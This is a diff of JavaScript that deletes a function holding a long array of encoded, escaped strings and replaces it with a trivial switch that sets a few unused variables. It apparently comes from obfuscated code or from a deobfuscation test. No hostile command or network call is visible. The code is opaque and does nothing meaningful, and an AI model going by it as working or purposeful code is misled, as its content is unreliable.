@@ -1,8 +1,13 @@
-var pf = function() {
-    sf = ["&VWN+/o\">0*", "Q<", "l,K", "--7=", "i$]\x40<jay$>_.>=\x3f", "9", "3Hj", "\x07\\\x4021pP^", "6^. ", "}\x00_\x3fLP7(W\x40-FO:2R&l-5BI5\rS_U9%\vZ\x3f1BLR=V8T >89N\"^^C\"2\x07VZZ7eWMYn::H(\"hzJ>JS", "tD$.", "\x00J3FQCY#/\nXPY>7", "|h", "v\vBS82\x07lT%$", "^\"5\tU", "#P\bZ\"*EQ=U\")y\v]5\rf]C1l\x07", "8>n&HXEz\x3f2]G", "3!Nv\byb3)", "ni32#WY4", "O+\x3f(", "t5*A\x40)S#--", "J#kSEU>$\n#Zf!!Z", "2)-N=", "+.", "L\x40P-[qwCS<Vl\x00z Y\x3fZETD%", "vH<5[", "VY:", "*lT\"1tDH\'S/*0(", "6 WzH+>Q$8+#", "9CRTN3%*7", ">L\x40XQ75\x07cG<,PVU!(", "[\\[;,^Y8", "EEO:$", "/64B7XDPT:$", "R3\'\x07V*G>5FWH7", "[LZrW:\"RP5", "(4J<", "G4$G\\o:/Y", "oWR]13\x00]", "]1ACTy0", "_%/;D]YPE8\'B\nS2oH_(}3>8#", "69", "G EW", "\\\\7,\x40DH\'5O", "1)cd%\x070cfvpMjuW\"P0.}~", "\\1Y__s.1\x40\t\\>+q\x40O;/", "1QDW57JSY<7(E//\"\x07H%YYC", "9\rG<HUE~3 \nV\tF,DK]\"", "BUL+\x3f", "]TO&3\v\x40", "g", "!kP", "D30AQ", "F^A", "`*mX", "bYD3$*1R\b^-BAS9", "AZ#&\x07\x40", "5 EDI\"", "l}uwS\x07}\x07", "C8*", "CY_S", "P", "#!)", "hb", "\rP%T5*rUS/5Z {o*H\na[RP:>\x07\\\\\" ", "Vc>,\x40\x40O", "\x3f>N8", "(r ", "!6/N%]", "\'DXUY!", "U5)+;D\"", "t", "l\b", "\x40", "X81", "#E_WB", "i\t-G-T%,QdP+/", "_-%)8\rJ\"I", "\ty", "z<T", "%$\x00~F\"$D\x40", "vY9&\x3fT#1Kl\"<(\"", "\tG)A>7BBY\x3f]5)*", "YYw_.$\n", "/c$\"", "C\bZ%*W\\L+", "3[0&WLJ+5:L5%646N(Y", "U/(<\"", "TZ=*\x40DH\'5", "U9,G6Z0!wLQ+", "9\rD;DS", "l\r", "VY:4)]7)\n3E1A", "|t", "_\x00\f", "!)", "%j& AAN\'\x00>N:2", "\rR\bt%", "\t\x07[\\6-W", "iP", "e%", "`L\x07qc,_Be\bEe*F", "a3#%GW\\\x3f1FBN\')H$l\t$", "<49WcJ _8XBiZ]R$3K\x40A{", "\"_Q-BKH!", ".O)", "\rE\x3f^FPU3", "i", "&\vtX45BAO", "GYk\x40]>%2F$", "X\x3fAFW", "`S_Z9", "U*", "X\nJ", "Y8*\v\fWB\x3f", "}\x07", "LLR:)y7)7.", "*-U\")\x3fD\"T", "2a\tfIY#5H", "ahhV", "5) >\x3f6R H", "R41lRR4L$>-#&N#NDXF\".", "}", "/S\r#.\x3fh1^S", "XDRUS8", "\x07V UDR/:N(lnkV", "/8)\x07\v", "B>]CE", "3$\x40N[<.R%a*#\fH", "# WPN ", "TMU-", "iBS\"\b\x07", "PB03FZ!{x(><9D\"", ">\x07]9NS\\Y\"(", "HS454R/):.\vD>", "\r7~3x", ";.V7Z\' gDH/", "O;(_3%;\x3f", "t21JSY#H", "tkS", "\b\\#"];
-};
-var qf = function() {
-    Hf = [tw];
-};
+var i = 10;
+var Xw;
+var Gw;
 
-qf();
+switch (i) {
+    case 10:
+                Xw = 1;
+                Gw = 2;
+                c4 = 139;
+                zw = 3;
+                tO = 2 - 1 + zw;
+                break;
+           }
